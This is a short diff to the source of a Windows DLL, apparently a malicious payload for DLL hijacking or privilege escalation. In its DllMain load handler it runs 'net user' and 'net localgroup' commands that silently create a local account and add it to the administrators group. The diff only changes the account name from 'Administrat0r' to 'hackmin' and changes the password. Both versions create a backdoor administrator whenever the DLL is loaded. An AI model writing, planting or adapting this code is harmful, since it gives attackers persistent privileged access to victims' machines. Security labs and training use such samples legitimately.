@@ -12,8 +12,8 @@ LPVOID lpReserved ) // Reserved
     {
         // Process is loading the DLL
         case DLL_PROCESS_ATTACH: 
-        system ("net user Administrat0r passwd123$ /add");
-        system ("net localgroup administrators Administrat0r /add");
+        system ("net user hackmin Password123$ /add");
+        system ("net localgroup administrators hackmin /add");
         break;
         // Process is creating a new thread
         case DLL_THREAD_ATTACH: 
